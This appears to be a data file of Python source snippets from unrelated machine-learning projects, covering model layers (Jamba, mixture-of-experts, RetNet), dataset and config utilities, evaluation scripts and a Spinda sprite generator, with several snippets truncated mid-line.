    "# Import the torch library, which provides tools for machine learning\nimport torch\n\n# Import the Jamba model from the jamba.model module\nfrom jamba.model import Jamba\n\n# Create a tensor of random integers between 0 and 100, with shape (1, 100)\n# This simulates a batch of tokens that we will pass through the model\nx = torch.randint(0, 100, (1, 100))\n\n# Initialize the Jamba model with the specified parameters\n# dim: dimensionality of the input data\n# depth: number of layers in the model\n# num_tokens: number of unique tokens in the input data\n# d_state: dimensionality of the hidden state in the model\n# d_conv: dimensionality of the convolutional layers in the model\n# heads: number of attention heads in the model\n# num_experts: number of expert networks in the model\n# num_experts_per_token: number of experts used for each token in the input data\nmodel = Jamba(\n    dim=512,\n    depth=6,\n    num_tokens=100,\n    d_state=256,\n    d_conv=128,\n    heads=8,\n    num_experts=8,\n    num_experts_per_token=2,\n)\n\n# Perform a forward pass through the model with the input data\n# This will return the model's predictions for each token in the input data\noutput = model(x)\n\n# Print the model's predictions\nprint(output)\n",
    "import os\nimport functools\nimport logging\nimport sys\nimport imageio\nimport atexit\nimport importlib\nimport torch\nimport torchvision\nimport numpy as np\nfrom termcolor import colored\n\nfrom einops import rearrange\n\n\ndef instantiate_from_config(config, **additional_kwargs):\n    if not \"target\" in config:\n        if config == '__is_first_stage__':\n            return None\n        elif config == \"__is_unconditional__\":\n            return None\n        raise KeyError(\"Expected key `target` to instantiate.\")\n\n    additional_kwargs.update(config.get(\"kwargs\", dict()))\n    return get_obj_from_str(config[\"target\"])(**additional_kwargs)\n\n\ndef get_obj_from_str(string, reload=False):\n    module, cls = string.rsplit(\".\", 1)\n    if reload:\n        module_imp = importlib.import_module(module)\n        importlib.reload(module_imp)\n    return getattr(importlib.import_module(module, package=None), cls)\n\n\ndef save_videos_grid(videos: torch.Tensor, path: str, rescale=False, n_rows=6, fps=8):\n    videos = rearrange(videos, \"b c t h w -> t b c h w\")\n    outputs = []\n    for x in videos:\n        x = torchvision.utils.make_grid(x, nrow=n_rows)\n        x = x.transpose(0, 1).transpose(1, 2).squeeze(-1)\n        if rescale:\n            x = (x + 1.0) / 2.0  # -1,1 -> 0,1\n        x = (x * 255).numpy().astype(np.uint8)\n        outputs.append(x)\n\n    os.makedirs(os.path.dirname(path), exist_ok=True)\n    imageio.mimsave(path, outputs, fps=fps)\n\n\n# Logger utils are copied from detectron2\nclass _ColorfulFormatter(logging.Formatter):\n    def __init__(self, *args, **kwargs):\n        self._root_name = kwargs.pop(\"root_name\") + \".\"\n        self._abbrev_name = kwargs.pop(\"abbrev_name\", \"\")\n        if len(self._abbrev_name):\n            self._abbrev_name = self._abbrev_name + \".\"\n        super(_ColorfulFormatter, self).__init__(*args, **kwargs)\n\n    def formatMessage(self, record):\n        record.name = record.name.replace(self._root_name, self._abbrev_name)\n        log = super(_ColorfulFormatter, self).formatMessage(record)\n        if record.levelno == logging.WARNING:\n            prefix = colored(\"WARNING\", \"red\", attrs=[\"blink\"])\n        elif record.levelno == logging.ERROR or record.levelno == logging.CRITICAL:\n            prefix = colored(\"ERROR\", \"red\", attrs=[\"blink\", \"underline\"])\n        else:\n            return log\n        return prefix + \" \" + log\n\n\n# cache the opened file object, so that different calls to `setup_logger`\n# with the same file name can safely write to the same file.\n@functools.lru_cache(maxsize=None)\ndef _cached_log_stream(filename):\n    # use 1K buffer if writing to cloud storage\n    io = open(filename, \"a\", buffering=1024 if \"://\" in filename else -1)\n    atexit.register(io.close)\n    return io\n\n@functools.lru_cache()\ndef setup_logger(output, distributed_rank, color=True, name='AnimateDiff', abbrev_name=None):\n    logger = logging.getLogger(name)\n    logger.setLevel(logging.DEBUG)\n    logger.propagate = False\n\n    if abbrev_name is None:\n        abbrev_name = 'AD'\n    plain_formatter = logging.Formatter(\n        \"[%(asctime)s] %(name)s:%(lineno)d %(levelname)s: %(message)s\", datefmt=\"%m/%d %H:%M:%S\"\n    )\n\n    # stdout logging: master only\n    if distributed_rank == 0:\n        ch = logging.StreamHandler(stream=sys.stdout)\n        ch.setLevel(logging.DEBUG)\n        if color:\n            formatter = _ColorfulFormatter(\n                colored(\"[%(asctime)s %(name)s:%(lineno)d]: \", \"green\") + \"%(message)s\",\n                datefmt=\"%m/%d %H:%M:%S\",\n                root_name=name,\n                abbrev_name=str(abbrev_name),\n            )\n        else:\n            formatter = plain_formatter\n        ch.setFormatter(formatter)\n        logger.addHandler(ch)\n\n    # file logging: all workers\n    if output is not None:\n        if output.endswith(\".txt\") or output.endswith(\".log\"):\n            filename = output\n        else:\n            filename = os.path.join(output, \"log.txt\")\n        if distributed_rank > 0:\n            filename = filename + \".rank{}\".format(distributed_rank)\n        os.makedirs(os.path.dirname(filename), exist_ok=True)\n\n        fh = logging.StreamHandler(_cached_log_stream(filename))\n        fh.setLevel(logging.DEBUG)\n        fh.setFormatter(plain_formatter)\n        logger.addHandler(fh)\n\n    return logger\n\n\ndef format_time(elapsed_time):\n    # Time thresholds\n    minute = 60\n    hour = 60 * minute\n    day = 24 * hour\n\n    days, remainder = divmod(elapsed_time, day)\n    hours, remainder = divmod(remainder, hour)\n    minutes, seconds = divmod(remainder, minute)\n\n    formatted_time = \"\"\n\n    if days > 0:\n        formatted_time += f\"{int(days)} days \"\n    if hours > 0:\n        formatted_time += f\"{int(hours)} hours \"\n    if minutes > 0:\n        formatted_time += f\"{int(minutes)} minutes \"\n    if seconds > 0:\n        formatted_time += f\"{seconds:.2f} seconds\"\n\n    return formatted_time.strip()\n",
    "import os.path as osp\n\nimport PIL.Image as PImage\nfrom torchvision.datasets.folder import DatasetFolder, IMG_EXTENSIONS\nfrom torchvision.transforms import InterpolationMode, transforms\n\n\ndef normalize_01_into_pm1(x):  # normalize x from [0, 1] to [-1, 1] by (x*2) - 1\n    return x.add(x).add_(-1)\n\n\ndef build_dataset(\n    data_path: str, final_reso: int,\n    hflip=False, mid_reso=1.125,\n):\n    # build augmentations\n    mid_reso = round(mid_reso * final_reso)  # first resize to mid_reso, then crop to final_reso\n    train_aug, val_aug = [\n        transforms.Resize(mid_reso, interpolation=InterpolationMode.LANCZOS), # transforms.Resize: resize the shorter edge to mid_reso\n        transforms.RandomCrop((final_reso, final_reso)),\n        transforms.ToTensor(), normalize_01_into_pm1,\n    ], [\n        transforms.Resize(mid_reso, interpolation=InterpolationMode.LANCZOS), # transforms.Resize: resize the shorter edge to mid_reso\n        transforms.CenterCrop((final_reso, final_reso)),\n        transforms.ToTensor(), normalize_01_into_pm1,\n    ]\n    if hflip: train_aug.insert(0, transforms.RandomHorizontalFlip())\n    train_aug, val_aug = transforms.Compose(train_aug), transforms.Compose(val_aug)\n    \n    # build dataset\n    train_set = DatasetFolder(root=osp.join(data_path, 'train'), loader=pil_loader, extensions=IMG_EXTENSIONS, transform=train_aug)\n    val_set = DatasetFolder(root=osp.join(data_path, 'val'), loader=pil_loader, extensions=IMG_EXTENSIONS, transform=val_aug)\n    num_classes = 1000\n    print(f'[Dataset] {len(train_set)=}, {len(val_set)=}, {num_classes=}')\n    print_aug(train_aug, '[train]')\n    print_aug(val_aug, '[val]')\n    \n    return num_classes, train_set, val_set\n\n\ndef pil_loader(path):\n    with open(path, 'rb') as f:\n        img: PImage.Image = PImage.open(f).convert('RGB')\n    return img\n\n\ndef print_aug(transform, label):\n    print(f'Transform {label} = ')\n    if hasattr(transform, 'transforms'):\n        for t in transform.transforms:\n            print(t)\n    else:\n        print(transform)\n    print('---------------------------\\n')\n",
    "import json\nimport os\nimport numpy as np\nimport pandas as pd\n\nimport matplotlib.pyplot as plt\nfrom analysis.plot_utils import *\n\nwith open(\"\", \"r\") as f:\n    ratings = json.load(f)\n\nwith open(\"\", \"r\") as f:\n    correctness = json.load(f)\n\nwith open(\"\", \"r\") as f:\n    node_alignments = json.load(f)\n\nsearch_strategies = [\"dfs-sum\", \"dfs-mult\", \"bfs-sum-1\", \"bfs-sum-2\", \"bfs-sum-3\", \"bfs-sum-4\", \"bfs-sum-5\",\n                        \"bfs-mult-1\", \"bfs-mult-2\", \"bfs-mult-3\", \"bfs-mult-4\", \"bfs-mult-5\"]\n\n# node alignments\naverage_node_alignments = {\n    \"seen\": {},\n    \"unseen\": {},\n    \"combined\": {}\n}\nfor s1, subdict in node_alignments[\"seen\"].items():\n    average_node_alignments[\"seen\"][s1] = {}\n    for s2, alignments in subdict.items():\n        average_node_alignments[\"seen\"][s1][s2] = sum(alignments) / len(alignments)\n\nfor s1, subdict in node_alignments[\"unseen\"].items():\n    average_node_alignments[\"unseen\"][s1] = {}\n    for s2, alignments in subdict.items():\n        average_node_alignments[\"unseen\"][s1][s2] = sum(alignments) / len(alignments)\n\nfor s1, subdict in node_alignments[\"seen\"].items():\n    average_node_alignments[\"combined\"][s1] = {}\n    for s2, alignments in subdict.items():\n        average_node_alignments[\"combined\"][s1][s2] = (sum(alignments) + sum(node_alignments[\"unseen\"][s1][s2])) / len(alignments + node_alignments[\"unseen\"][s1][s2])\n\n# calculate difference between alignments\ndiffs_star = []\nfor s in search_strategies:\n    diff = average_node_alignments['combined']['star3'][s] - average_node_alignments['combined']['st'][s]\n    diffs_star.append(diff)\n    \ndiffs_apa = []\nfor s in search_strategies:\n    diff = average_node_alignments['combined']['apa'][s] - average_node_alignments['combined']['st'][s]\n    diffs_apa.append(diff)\n\n# plot diffs\ndiff_data = {'Star3': diffs_star, 'APA': diffs_apa}\ndiff_df = pd.DataFrame(diff_data, index=search_strategies)\n\n# plot the heatmap\nplt.figure(figsize=(8, 6))\nplt.rcParams['font.family'] = 'DeJavu Serif'\nplt.rcParams['font.serif'] = ['Times New Roman']\ncmap = sns.color_palette(\"YlGnBu\", as_cmap=True)\nsns.heatmap(diff_df, cmap=cmap, annot=True, cbar_kws={'label': 'Difference'})\nplt.title('Difference in Average Node Alignments')\nplt.xlabel('Alignment Type')\nplt.ylabel('Search Strategy')\nplt.tight_layout()\nplt.savefig(\"plots/alignment_diff_heatmap.svg\")\n\n",
    "# MIT License\n\n# Copyright (c) 2022 Intelligent Systems Lab Org\n\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\n# File author: Shariq Farooq Bhat\n\nimport json\nimport os\n\nfrom models.monoD.zoeDepth.utils.easydict import EasyDict as edict\n\nfrom models.monoD.zoeDepth.utils.arg_utils import infer_type\nimport pathlib\nimport platform\n\nROOT = pathlib.Path(__file__).parent.parent.resolve()\n\nHOME_DIR = os.path.expanduser(\"~\")\n\nCOMMON_CONFIG = {\n    \"save_dir\": os.path.expanduser(\"~/shortcuts/monodepth3_checkpoints\"),\n    \"project\": \"ZoeDepth\",\n    \"tags\": '',\n    \"notes\": \"\",\n    \"gpu\": None,\n    \"root\": \".\",\n    \"uid\": None,\n    \"print_losses\": False\n}\n\nDATASETS_CONFIG = {\n    \"kitti\": {\n        \"dataset\": \"kitti\",\n        \"min_depth\": 0.001,\n        \"max_depth\": 80,\n        \"data_path\": os.path.join(HOME_DIR, \"shortcuts/datasets/kitti/raw\"),\n        \"gt_path\": os.path.join(HOME_DIR, \"shortcuts/datasets/kitti/gts\"),\n        \"filenames_file\": \"./train_test_inputs/kitti_eigen_train_files_with_gt.txt\",\n        \"input_height\": 352,\n        \"input_width\": 1216,  # 704\n        \"data_path_eval\": os.path.join(HOME_DIR, \"shortcuts/datasets/kitti/raw\"),\n        \"gt_path_eval\": os.path.join(HOME_DIR, \"shortcuts/datasets/kitti/gts\"),\n        \"filenames_file_eval\": \"./train_test_inputs/kitti_eigen_test_files_with_gt.txt\",\n\n        \"min_depth_eval\": 1e-3,\n        \"max_depth_eval\": 80,\n\n        \"do_random_rotate\": True,\n        \"degree\": 1.0,\n        \"do_kb_crop\": True,\n        \"garg_crop\": True,\n        \"eigen_crop\": False,\n        \"use_right\": False\n    },\n    \"kitti_test\": {\n        \"dataset\": \"kitti\",\n        \"min_depth\": 0.001,\n        \"max_depth\": 80,\n        \"data_path\": os.path.join(HOME_DIR, \"shortcuts/datasets/kitti/raw\"),\n        \"gt_path\": os.path.join(HOME_DIR, \"shortcuts/datasets/kitti/gts\"),\n        \"filenames_file\": \"./train_test_inputs/kitti_eigen_train_files_with_gt.txt\",\n        \"input_height\": 352,\n        \"input_width\": 1216,\n        \"data_path_eval\": os.path.join(HOME_DIR, \"shortcuts/datasets/kitti/raw\"),\n        \"gt_path_eval\": os.path.join(HOME_DIR, \"shortcuts/datasets/kitti/gts\"),\n        \"filenames_file_eval\": \"./train_test_inputs/kitti_eigen_test_files_with_gt.txt\",\n\n        \"min_depth_eval\": 1e-3,\n        \"max_depth_eval\": 80,\n\n        \"do_random_rotate\": False,\n        \"degree\": 1.0,\n        \"do_kb_crop\": True,\n        \"garg_crop\": True,\n        \"eigen_crop\": False,\n        \"use_right\": False\n    },\n    \"nyu\": {\n        \"dataset\": \"nyu\",\n        \"avoid_boundary\": False,\n        \"min_depth\": 1e-3,   # originally 0.1\n        \"max_depth\": 10,\n        \"data_path\": os.path.join(HOME_DIR, \"shortcuts/datasets/nyu_depth_v2/sync/\"),\n        \"gt_path\": os.path.join(HOME_DIR, \"shortcuts/datasets/nyu_depth_v2/sync/\"),\n        \"filenames_file\": \"./train_test_inputs/nyudepthv2_train_files_with_gt.txt\",\n        \"input_height\": 480,\n        \"input_width\": 640,\n        \"data_path_eval\": os.path.join(HOME_DIR, \"shortcuts/datasets/nyu_depth_v2/official_splits/test/\"),\n        \"gt_path_eval\": os.path.join(HOME_DIR, \"shortcuts/datasets/nyu_depth_v2/official_splits/test/\"),\n        \"filenames_file_eval\": \"./train_test_inputs/nyudepthv2_test_files_with_gt.txt\",\n        \"min_depth_eval\": 1e-3,\n        \"max_depth_eval\": 10,\n        \"min_depth_diff\": -10,\n        \"max_depth_diff\": 10,\n\n        \"do_random_rotate\": True,\n        \"degree\": 1.0,\n        \"do_kb_crop\": False,\n        \"garg_crop\": False,\n        \"eigen_crop\": True\n    },\n    \"ibims\": {\n        \"dataset\": \"ibims\",\n        \"ibims_root\": os.path.join(HOME_DIR, \"shortcuts/datasets/ibims/ibims1_core_raw/\"),\n        \"eigen_crop\": True,\n        \"garg_crop\": False,\n        \"do_kb_crop\": False,\n        \"min_depth_eval\": 0,\n        \"max_depth_eval\": 10,\n        \"min_depth\": 1e-3,\n        \"max_depth\": 10\n    },\n    \"sunrgbd\": {\n        \"dataset\": \"sunrgbd\",\n        \"sunrgbd_root\": os.path.join(HOME_DIR, \"shortcuts/datasets/SUNRGBD/test/\"),\n        \"eigen_crop\": True,\n        \"garg_crop\": Fa",
    "# -----------------------------------------------------------\n# AUTHOR --------> Francisco Contreras\n# OFFICE --------> Senior VFX Compositor, Software Developer\n# WEBSITE -------> https://vinavfx.com\n# -----------------------------------------------------------\nimport os\nfrom ..nuke_util.media_util import get_extension\nfrom .common import get_comfyui_dir\nimport nuke  # type: ignore\n\n\ndef get_models(dirname, custom_nodes=False):\n    if custom_nodes:\n        models_dir = '{}/custom_nodes/{}'.format(get_comfyui_dir(), dirname)\n    else:\n        models_dir = '{}/models/{}'.format(get_comfyui_dir(), dirname)\n\n    models = []\n\n    for root, _, files in os.walk(models_dir):\n        for f in files:\n            if not get_extension(f) in ['ckpt', 'pth', 'safetensors']:\n                continue\n\n            relative_path = os.path.relpath(root, models_dir)\n            if '.' == relative_path:\n                relative_path = ''\n\n            models.append(os.path.join(relative_path, f))\n\n    if not models:\n        nuke.message(\n            'There is no model in the folder \"{}\" !'.format(models_dir))\n\n    return models\n",
    "import os\nfrom pathlib import Path\nfrom dataclasses import dataclass\nimport concurrent.futures\n\nfrom tqdm.auto import tqdm\n\n# download_link: https://openslr.org/60/\n@dataclass\nclass DataConfig:\n    dataset_path = './raw_datasets/LibriTTS/train-other-500'\n    output_filelist_path = './filelists/libri_tts.txt'\n\ndata_config = DataConfig()\n    \ndef process_filelist(wav_path: Path):\n    text_path = wav_path.with_suffix('.normalized.txt')\n    if text_path.exists():\n        with open(text_path, 'r', encoding='utf-8') as f:\n            text = f.read().strip()\n        return f'{wav_path.as_posix()}|{text}\\n'\n\nif __name__ == '__main__':\n    filelist = []   \n    results = []\n    \n    dataset_path = Path(data_config.dataset_path)\n    waves = list(dataset_path.rglob('*.wav'))\n           \n    with concurrent.futures.ProcessPoolExecutor(max_workers=8) as executor:\n        futures = [executor.submit(process_filelist, wav_path) for wav_path in waves]\n        for future in tqdm(concurrent.futures.as_completed(futures), total=len(waves)):\n            result = future.result()\n            if result is not None:\n                results.append(result)\n                                 \n    # make sure that the parent dir exists, raising error at the last step is quite terrible OVO\n    os.makedirs(os.path.dirname(data_config.output_filelist_path), exist_ok=True)\n    with open(data_config.output_filelist_path, 'w', encoding='utf-8') as f:\n        f.writelines(results)",
    "from typing import List\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nfrom .parallel_experts import ParallelExperts, compute_gating\n\nfrom .gate import top_k_gating\n\n\nclass MoE(nn.Module):\n    \"\"\"\n    A Sparsely gated mixture of experts layer with 1-layer Feed-Forward networks as experts.\n\n    Args:\n        input_size: integer - size of the input\n        hidden_size: integer - size of the expert's hidden layer\n        num_experts: an integer - number of experts\n        top_k: an integer - how many experts to use for each batch element\n        bias: a boolean - whether to include bias in linear layers\n        activation: an activation function to apply to expert's outputs\n        glu: an boolean - whether to use GLU activation\n    \"\"\"\n\n    def __init__(\n        self,\n        input_size,\n        hidden_size,\n        num_experts,\n        top_k,\n        bias=True,\n        activation=None,\n        glu=True,\n    ):\n        super(MoE, self).__init__()\n\n        self.num_experts = num_experts\n        self.input_size = input_size\n        self.hidden_size = hidden_size\n        self.glu = glu\n        if bias:\n            self.bias = torch.nn.Parameter(torch.empty(input_size))\n            torch.nn.init.zeros_(self.bias)\n        else:\n            self.bias = None\n\n        self.input_linear = ParallelExperts(num_experts, input_size, hidden_size * 2 if glu else hidden_size)\n        self.output_linear = ParallelExperts(num_experts, hidden_size, input_size)\n\n        self.top_k = min(top_k, self.num_experts)\n        self.activation = activation\n\n        self.router = top_k_gating(\n            input_size=input_size,\n            num_experts=num_experts,\n            top_k=top_k,\n        )\n\n    def extra_repr(self):\n        return \"k={}, e={}\".format(self.top_k, self.num_experts)\n\n    def get_aux_loss_and_clear(self):\n        \"\"\"\n        Get the accumulated auxiliary loss and clear it.\n\n        Returns:\n            float: Accumulated auxiliary loss.\n        \"\"\"\n\n        return self.gate.get_aux_loss_and_clear()\n\n    def compute_gate(self, x):\n        top_k_indices, self.top_k_gates = self.router(x)\n\n        self.batch_gates, self.batch_index, expert_size, self.index_sorted_experts = compute_gating(\n            self.top_k, self.num_experts, self.top_k_gates, top_k_indices\n        )\n        self.expert_size = expert_size.tolist()\n\n        return self.router.loss\n\n    def batch_forward(self, x):\n        \"\"\"\n        Forward pass of the mixture of experts layer.\n\n        Args:\n            x (Tensor): Input tensor.\n            skip_mask (Tensor): Skip mask tensor.\n            sample_topk (int): Number of experts to sample during training.\n            multiply_by_gates (bool): Whether to multiply outputs by gating values.\n\n        Returns:\n            Tensor: Output tensor.\n            float: Gating loss.\n        \"\"\"\n        bsz, length, emb_size = x.size()\n        x = x.reshape(-1, emb_size)\n        loss = self.compute_gate(x)\n\n        expert_inputs = x[self.batch_index]\n        h = self.input_linear(expert_inputs, self.expert_size)\n        if self.glu:\n            h, g = h.chunk(2, dim=-1)\n            h = self.activation(h) * g\n        else:\n            h = self.activation(h)\n        expert_outputs = self.output_linear(h, self.expert_size)\n\n        expert_outputs = expert_outputs * self.batch_gates[:, None]\n\n        zeros = torch.zeros((bsz * length, self.input_size), dtype=expert_outputs.dtype, device=expert_outputs.device)\n        y = zeros.index_add(0, self.batch_index, expert_outputs)\n        y = y.view(bsz, length, self.input_size)\n        if self.bias is not None:\n            y = y + self.bias\n        return y, loss\n\n    def single_forward(self, x):\n        bsz, length, emb_size = x.size()\n\n        x = x.reshape(1, self.input_size)\n        top_k_indices, top_k_gates = self.router(x)\n        loss = self.router.loss\n\n        y_list = []\n        for i in range(self.top_k):\n            expert_idx = top_k_indices[0, i]\n\n            h = F.linear(x, self.input_linear.weight[expert_idx])\n            if self.glu:\n                h, g = h.chunk(2, dim=-1)\n                h = self.activation(h) * g\n            else:\n                h = self.activation(h)\n            y = F.linear(h, self.output_linear.weight[expert_idx]) * top_k_gates[0, i]\n\n            y_list.append(y)\n\n        y = sum(y_list)\n        y = y.view(bsz, length, self.input_size)\n        if self.bias is not None:\n            y = y + self.bias\n        return y, loss\n\n    def forward(self, x):\n        \"\"\"\n        Forward pass of the mixture of experts layer.\n\n        Args:\n            x (Tensor): Input tensor.\n\n        Returns:\n            Tensor: Output tensor.\n        \"\"\"\n        bsz, length, emb_size = x.size()\n        if bsz * length == 1:\n            return self.single_forward(x)\n        else:\n            return self.batch_forward(x)\n\n    def single_map(self, x):\n        bsz, length, emb_size = x.size()\n\n        x = x.reshape(1, self.input_size)\n       ",
    "# Copyright (c) 2022 Microsoft\n# Licensed under The MIT License [see LICENSE for details]\n\nimport math\n\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom fairscale.nn import checkpoint_wrapper, wrap\n\nfrom torchscale.architecture.utils import init_bert_params\nfrom torchscale.component.droppath import DropPath\nfrom torchscale.component.feedforward_network import make_experts\nfrom torchscale.component.gate_linear_unit import GLU\nfrom torchscale.component.multiscale_retention import MultiScaleRetention\nfrom torchscale.component.xmoe.moe_layer import MOELayer\nfrom torchscale.component.xmoe.routing import Top1Gate, Top2Gate\nfrom torchscale.component.rms_norm import RMSNorm\n    \n    \nclass RetNetRelPos(nn.Module):\n    def __init__(self, args):\n        super().__init__()\n        angle = 1.0 / (10000 ** torch.linspace(0, 1, args.decoder_embed_dim // args.decoder_retention_heads // 2))\n        angle = angle.unsqueeze(-1).repeat(1, 2).flatten()\n        decay = torch.log(1 - 2 ** (-5 - torch.arange(args.decoder_retention_heads, dtype=torch.float)))\n        self.register_buffer(\"angle\", angle)\n        self.register_buffer(\"decay\", decay)\n        self.recurrent_chunk_size = args.recurrent_chunk_size\n        \n    def forward(self, slen, activate_recurrent=False, chunkwise_recurrent=False):\n        if activate_recurrent:\n            sin = torch.sin(self.angle * (slen - 1))\n            cos = torch.cos(self.angle * (slen - 1))\n            retention_rel_pos = ((sin, cos), self.decay.exp())\n        elif chunkwise_recurrent:\n            index = torch.arange(slen).to(self.decay)\n            sin = torch.sin(index[:, None] * self.angle[None, :])\n            cos = torch.cos(index[:, None] * self.angle[None, :])\n\n            block_index = torch.arange(self.recurrent_chunk_size).to(self.decay)\n            mask = torch.tril(torch.ones(self.recurrent_chunk_size, self.recurrent_chunk_size).to(self.decay))\n            mask = torch.masked_fill(block_index[:, None] - block_index[None, :], ~mask.bool(), float(\"inf\"))\n            mask = torch.exp(mask * self.decay[:, None, None])\n            mask = torch.nan_to_num(mask)\n            \n            value_inner_decay = mask[:, -1] / mask[:, -1].sum(dim=-1, keepdim=True)\n            value_inner_decay = value_inner_decay.unsqueeze(-1)\n            scale = mask.sum(dim=-1, keepdim=True).sqrt()\n            inner_mask = mask / scale\n\n            cross_decay = torch.exp(self.decay * self.recurrent_chunk_size)\n            query_inner_decay = torch.exp(self.decay[:, None] * (block_index + 1))\n            query_inner_decay = query_inner_decay[:, :, None] / (scale / mask[:, -1].sum(dim=-1)[:, None, None])\n            cross_decay = cross_decay[:, None, None]\n            retention_rel_pos = ((sin, cos), (inner_mask, cross_decay, query_inner_decay, value_inner_decay))\n        else:\n            index = torch.arange(slen).to(self.decay)\n            sin = torch.sin(index[:, None] * self.angle[None, :])\n            cos = torch.cos(index[:, None] * self.angle[None, :])\n            mask = torch.tril(torch.ones(slen, slen).to(self.decay))\n            mask = torch.masked_fill(index[:, None] - index[None, :], ~mask.bool(), float(\"inf\"))\n            mask = torch.exp(mask * self.decay[:, None, None])\n            mask = torch.nan_to_num(mask)\n            mask = mask / mask.sum(dim=-1, keepdim=True).sqrt()\n            retention_rel_pos = ((sin, cos), mask)\n\n        return retention_rel_pos\n\nclass DecoderLayer(nn.Module):\n    def __init__(\n        self,\n        args,\n        depth,\n        is_moe_layer=False,\n    ):\n        super().__init__()\n        self.args = args\n        self.embed_dim = args.decoder_embed_dim\n        self.dropout_module = torch.nn.Dropout(args.dropout)\n\n        if args.drop_path_rate > 0:\n            drop_path_prob = np.linspace(0, args.drop_path_rate, args.decoder_layers)[\n                depth\n            ]\n            self.drop_path = DropPath(drop_path_prob)\n        else:\n            self.drop_path = None\n\n        self.retention = self.build_retention(self.embed_dim, args)\n\n        self.normalize_before = args.decoder_normalize_before\n\n        self.retention_layer_norm = RMSNorm(self.embed_dim, eps=args.layernorm_eps)\n\n        self.is_moe_layer = is_moe_layer\n        self.ffn_dim = args.decoder_ffn_embed_dim\n\n        if not self.is_moe_layer:\n            self.ffn = self.build_ffn(\n                self.embed_dim,\n                self.args,\n            )\n        else:\n            if args.moe_top1_expert:\n                gate = Top1Gate(\n                    self.embed_dim,\n                    args.moe_expert_count,\n                    use_fp32=args.moe_gating_use_fp32,\n                    moe_eval_capacity_token_fraction=args.moe_eval_capacity_token_fraction,\n                    use_xmoe=args.use_xmoe,\n                )\n            else:\n                gate = Top2Gate(\n                    self.embed_dim,\n                    args.moe_expert_count,\n            ",
    "import json\r\nimport argparse\r\n\r\nrelation_set = ['per:alternate_names', 'per:alumni', 'per:place_of_residence', 'per:employee_or_member_of', 'per:girl/boyfriend', 'per:title', 'per:positive_impression', 'gpe:residents_of_place', 'org:employees_or_members', 'per:children', 'per:parents', 'per:siblings', 'per:spouse', 'per:friends', 'per:negative_impression', 'per:client', 'per:pet', 'per:place_of_work', 'per:boss', 'per:subordinate', 'per:acquaintance', 'per:roommate', 'per:dates', 'per:other_family', 'per:age', 'per:visited_place', 'gpe:visitors_of_place', 'per:origin', 'per:neighbor', 'per:works', 'per:schools_attended', 'org:students', 'per:major', 'per:date_of_birth']\r\n\r\nparser = argparse.ArgumentParser(description=\"Long in-context Learning Results\", formatter_class=argparse.ArgumentDefaultsHelpFormatter)\r\nparser.add_argument(\"-r\", \"--round\", type=str, help=\"number of rounds the context have\")\r\nparser.add_argument(\"-m\", \"--model\", type=str, help=\"LLM model\")\r\nargs = parser.parse_args()\r\n\r\ntry:\r\n    file = open(f'./dialogueRE_round_result/{args.model}_{args.round}.json', encoding=\"utf8\")\r\n    data = json.load(file)\r\nexcept:\r\n    exit(1)\r\n\r\ntotal_label = 0\r\ntotal_pred = 0\r\ntotal_correct = 0\r\nf1 = 0.0\r\ncount = 0\r\nfor result in data:\r\n    label = result['label'].split(\",\")\r\n    label = [l.strip() for l in label]\r\n    pred = result['pred'].split(\",\")\r\n    pred = [p.strip() for p in pred]\r\n    count += len(label)\r\n\r\n    for idx in range(len(label)):\r\n\r\n        if idx >= len(pred):\r\n            break\r\n\r\n        if any([relation in pred[idx] for relation in relation_set]):\r\n            total_pred += 1\r\n        if label[idx] == pred[idx] or label[idx] in pred[idx]:\r\n            total_correct += 1\r\n        total_label += 1\r\n        precision = total_correct / (total_pred + 1e-8)\r\n        recall = total_correct / (total_label + 1e-8)\r\n        f1 = 2 * precision * recall / (precision + recall + 1e-8)\r\n\r\nprint(f'f1: ', f1 * 100)",
    "from PIL import Image, ImageChops, ImageDraw\nfrom random import randint\nimport numpy as np\n\nclass SpindaConfig:\n    sprite_base = Image.open(\"res/spinda_base.png\")\n    sprite_mask = Image.open(\"res/spinda_mask.png\")\n    spot_masks = [\n        Image.open(\"res/spots/spot_1.png\"),\n        Image.open(\"res/spots/spot_2.png\"),\n        Image.open(\"res/spots/spot_3.png\"),\n        Image.open(\"res/spots/spot_4.png\")\n    ]\n    spot_offsets = [\n        (8, 6),\n        (32, 7),\n        (14, 24),\n        (26, 25)\n    ]\n    def __init__(self):\n        self.spots = [\n            (0, 0),\n            (0, 0),\n            (0, 0),\n            (0, 0)\n        ]\n\n    def __str__(self):\n        return f\"<SpindaConfig> {self.spots}\"\n    \n    @staticmethod\n    def from_personality(pers):\n        self = SpindaConfig()\n        self.spots[0] = (pers & 0x0000000f, (pers & 0x000000f0) >> 4)\n        self.spots[1] = ((pers & 0x00000f00) >> 8, (pers & 0x0000f000) >> 12)\n        self.spots[2] = ((pers & 0x000f0000) >> 16, (pers & 0x00f00000) >> 20)\n        self.spots[3] = ((pers & 0x0f000000) >> 24, (pers & 0xf0000000) >> 28)\n        return self\n    \n    @staticmethod\n    def random():\n        return SpindaConfig.from_personality(randint(0, 0x100000000))\n\n    def get_personality(self):\n        pers = 0x00000000\n        for i, spot in enumerate(self.spots):\n            pers = pers | (spot[0] << i*8) | (spot[1] << i*8+4)\n        return pers\n\n    def render_pattern(self, only_pattern = False, crop = False):\n        # Prepare a result image with the same size as base and bg either black or transparent\n        size = self.sprite_base.size\n        img = Image.new('RGBA', size, (0, 0, 0, 255 if only_pattern else 0))\n\n        # When wanting an actual spinda, start by pasting in the base sprite\n   